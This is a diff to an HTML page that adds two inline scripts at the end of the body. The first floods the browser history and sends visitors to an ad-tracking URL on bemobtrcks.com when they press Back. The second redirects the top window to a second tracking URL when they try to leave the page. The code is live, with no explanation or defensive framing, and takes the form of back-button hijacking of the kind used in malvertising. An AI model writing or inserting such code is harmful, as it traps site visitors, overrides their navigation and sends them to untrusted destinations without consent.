@@ -53,5 +53,41 @@
 		document.head.appendChild(s);
 	</script>
 
+	<script>
+		! function() {
+		var t;
+		try {
+			const URL = window.location.href.split(/[#]/)[0];
+			for (t = 0; 10 > t; ++t) history.pushState({}, "", URL + '#')
+			onpopstate = function(event) {
+				event.state && location.replace('https://1c49p.bemobtrcks.com/click/3');
+			}
+		} catch (o) {
+			console.log(o);
+		}
+	}();
+	</script>
+
+	<script>
+		var redirecting = false;
+		
+		window.onbeforeunload = function() {
+		
+			if (redirecting) return;
+		
+			setTimeout(function() {
+		
+				window.top.location.href = 'https://1c49p.bemobtrcks.com/click/4';
+		
+				setTimeout(function() {
+					redirecting = true;
+				}, 1000);
+		
+		
+			}, 1);
+		
+		};
+		</script>
+
 </body>
 </html>
